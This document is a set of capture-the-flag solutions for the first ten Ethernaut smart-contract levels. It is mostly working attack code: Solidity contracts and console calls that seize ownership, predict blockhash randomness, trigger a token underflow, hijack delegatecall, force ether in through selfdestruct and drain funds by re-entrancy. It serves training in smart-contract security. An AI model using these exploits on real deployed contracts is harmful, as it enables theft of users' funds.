# ethernaut-ctf-solutions

<details>
    <summary>Level 1 - Fallback</summary>

```javascript
// first need to send some ether to contribute():
await contract.contribute({value: toWei("0.0001")})

// then send some raw ether, the fallback function will make us the owner
sendTransaction({from: player, to: instance, value: toWei("0.0001")})

// are we the owner yet?
await contract.owner() == player

// now that we're the owner, we can siphon the funds
await contract.withdraw()

// and double check that the contract has a balance of 0:
await getBalance(instance)
```

</details>

 <details>
    <summary>Level 2 - Fallout</summary>
    
```javascript
 /* constructor */
  function Fal1out() public payable    // <--- typo makes it not actually a constructor

// so just call this and you're the owner
await contract.Fal1out()
```

</details> 

 <details>
    <summary>Level 3 - Coin flip</summary>

Deploy this guesser contract, using e.g. Remix IDE:

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipGuess {
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip instance = CoinFlip(address(...));

  function guess() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    bool coinFlip = blockValue > FACTOR;
    require(instance.flip(coinFlip));
  }
}
```

Then repeatedly invoke the guess() function, calls will only go through when we know they will succeed in the `CoinFlip` contract.

</details> 

 <details>
    <summary>Level 4 - Telephone</summary>

Deploy this and call `ring_ring()`, we just need a smart contract to act as a buffer so that `msg.sender != tx.origin`. See also [rekt - THORChain](https://rekt.news/thorchain-rekt2/)

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract CallMeMaybe {
    Telephone instance = Telephone(address(...));
    
    function ring_ring() public {
        instance.changeOwner(msg.sender);
    }
}
```

</details> 

 <details>
    <summary>Level 5 - Token</summary>
    
```javascript
// trigger an underflow by transferring >20 tokens to any address
await contract.transfer("0xd4F3ae2100b186D5e8e0E41d7930bE7B3a3e9E6C", 100)
```

</details> 

 <details>
    <summary>Level 6 - Delegation</summary>
    
```javascript
// we want to hit the fallback function of the delegator, and pass it the selector of the pwn() function so that it invokes pwn() on the delegate

contract.sendTransaction({
    to: instance, 
    data: web3.eth.abi.encodeFunctionSignature("pwn()")
})

```

</details> 

 <details>
    <summary>Level 7 - Force</summary>

Relevant chapter in [Mastering Ethereum](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#unexpected-ether)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract TakeMyMoney {
    fallback() external payable {}
    
    function boom(address payable _address) public {
        selfdestruct(_address);
    }
}
```

</details> 

 <details>
    <summary>🏦 Level 8 - Vault</summary>

Find the transaction that was used to create the contract on Etherscan, and look in the state change tab. We can see the value that was stored in the first variable: that's the password, then we just invoke unlock with it:

```javascript
await contract.unlock("0x...")
```

</details> 

 <details>
    <summary>👑 Level 9 - King</summary>

Trying to make this contract the king, it should refuse eth transfers, hence preventing the ownership transfer. Deploy it with 1 ETH, so that it has a starting balance.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface King {
    function _king() external view returns (address payable);
}

contract KingMaker {
    constructor() public payable {}
    
    function kingMe(address kingInstance) public {
        // send ether using a low-level call because send/transfer are limited to 2300 gas
      // send exactly 1 ether, because we need to pass the condition but not exceed the balance of the King contract
        kingInstance.call{value:1 ether}("");
        require(King(kingInstance)._king() == address(this));
    }
    
    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

</details> 


 <details>
    <summary>🔁 Level 10 - Re-entrancy</summary>

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface Reentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract Withdrawer {
    Reentrance instance = Reentrance(address(...));
    uint amount = 0.1 ether;
    
    constructor() payable {}
    
    // this is where we trigger the re-entrancy bug
    receive() external payable {
        if (address(instance).balance >= amount)  {
            instance.withdraw(amount);
        }
    }
    
    function pullTheTrigger() public {
        instance.donate{value: amount}(address(this));
        instance.withdraw(amount);
    }
    
    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

</details> 
